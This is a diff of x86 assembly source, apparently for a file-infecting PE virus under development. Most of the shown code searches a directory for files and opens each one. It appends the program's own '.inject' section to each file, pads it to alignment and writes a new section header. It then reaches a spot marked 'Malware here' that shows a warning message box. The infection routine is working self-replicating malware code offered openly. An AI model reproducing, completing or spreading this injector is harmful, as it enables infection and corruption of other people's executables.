@@ -43,7 +43,7 @@ inject SEGMENT read write execute
     tempDword dd 0
     tempDword2 dd 0
     filePath db 260 DUP(0) ; filePath[MAX_PATH]
-    win32FindData db 320 DUP(0) ; To store WIN32_FIND_DATAA
+    temp320B db 320 DUP(0) ; To store WIN32_FIND_DATAA
     
     entrySectionOffset EQU $ - data_start
     
@@ -185,12 +185,12 @@ start:
 	ja section_header_loop
 	
 	section_header_found:
-	toStack selfSizeOfRawData, vaccess(offset filePath + 16)
+	toStack selfVirtualSize, vaccess(offset filePath + 8)
 	toStack selfPointerToRawData, vaccess(offset filePath + 20)
 	
     
     ; Find first file in directory
-    push daccess(offset win32FindData)
+    push daccess(offset temp320B)
     push daccess(offset strQuery)
     call fromStack(ffind1)
     toStack fileHand
@@ -202,7 +202,7 @@ start:
     push 0
 	push 0 ; No sharing
 	push 40000000h OR 80000000h ; GENERIC_READ | GENERIC_WRITE
-	push daccess(offset win32FindData) + 2Ch ; cFileName in WIN32_FIND_DATAA
+	push daccess(offset temp320B) + 2Ch ; cFileName in WIN32_FIND_DATAA
 	call fromStack(fopen)
 	toStack tgHand
 	
@@ -273,31 +273,57 @@ start:
     mov ecx, eax
     sub ecx, ebx
     mov daccess(tempDword), 0
-    pad_loop:
+    pad1_loop:
 		invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 1, daccess(tempDword2), 0
 		dec ecx
 		cmp ecx, 0
-    ja pad_loop
+    ja pad1_loop
+    invoke fromStack(fseek), fromStack(tgHand), 0, 0, SEEK_CUR
+	mov daccess(ishPointerToRawData), eax
     
-    mov ecx, fromStack(selfSizeOfRawData)
+    ; Copy .inject
+    mov ecx, fromStack(selfVirtualSize)
     invoke fromStack(fseek), fromStack(selfHand), fromStack(selfPointerToRawData), 0, SEEK_SET
     copy_start:
 		cmp ecx, 320
 		jbe copy_end
-		invoke fromStack(fread), fromStack(selfHand), daccess(win32FindData), 320, daccess(tempDword2), 0
-		invoke fromStack(fwrite), fromStack(tgHand), daccess(win32FindData), 320, daccess(tempDword2), 0
+		invoke fromStack(fread), fromStack(selfHand), daccess(temp320B), 320, daccess(tempDword2), 0
+		invoke fromStack(fwrite), fromStack(tgHand), daccess(temp320B), 320, daccess(tempDword2), 0
 		sub ecx, 320
     jmp copy_start
-    
     copy_end:
-	    invoke fromStack(fread), fromStack(selfHand), daccess(win32FindData), ecx, daccess(tempDword2), 0
-		invoke fromStack(fwrite), fromStack(tgHand), daccess(win32FindData), ecx, daccess(tempDword2), 0
+	    invoke fromStack(fread), fromStack(selfHand), daccess(temp320B), ecx, daccess(tempDword2), 0
+		invoke fromStack(fwrite), fromStack(tgHand), daccess(temp320B), ecx, daccess(tempDword2), 0
 		
+	; Register VirtualSize & SizeOfRawData
+	invoke fromStack(fseek), fromStack(tgHand), 0, 0, SEEK_CUR
+	mov ebx, eax
+	sub ebx, vaccess(ishPointerToRawData)
+	mov daccess(ishVirtualSize), ebx	
+	closest	eax, fromStack(FileAlignment)
+	mov daccess(ishSizeOfRawData), eax
+	
+	; Pad section
+	mov ecx, eax
+	sub ecx, vaccess(ishVirtualSize)
+    mov daccess(tempDword), 0
+	pad2_loop:
+		invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 1, daccess(tempDword2), 0
+		dec ecx
+		cmp ecx, 0
+    ja pad2_loop
+	
+	; Write new Section Header
+	invoke fromStack(fseek), fromStack(tgHand), fromStack(newish_offset), 0, SEEK_SET
+	invoke fromStack(fwrite), fromStack(tgHand), daccess(ishName), 40, daccess(tempDword2), 0
+	
+	; Edit SizeOfImage
+	
 	
     nextFile:
     invoke fromStack(fclose), fromStack(tgHand)
     
-    invoke fromStack(ffind2), fromStack(fileHand), daccess(offset win32FindData)
+    invoke fromStack(ffind2), fromStack(fileHand), daccess(offset temp320B)
     		
     cmp eax, 0
     jne openFile
@@ -305,6 +331,19 @@ start:
     ; No more file to write
     invoke fromStack(fclose), fromStack(selfHand)
     invoke fromStack(ffind0), fromStack(fileHand)
+    
+    ; Malware here
+    push 2030h ; MB_OK | MB_ICONWARNING | MB_TASKMODAL
+    push daccess(strCaption)
+    push daccess(strContent)
+    push 0
+    call fromStack(msgbox)
+    
+    to_exit:
+    mov eax, stack_reserved
+    imul eax, regSz
+    add esp, regSz
+    jmp exit
     
 inject ENDS
 end start
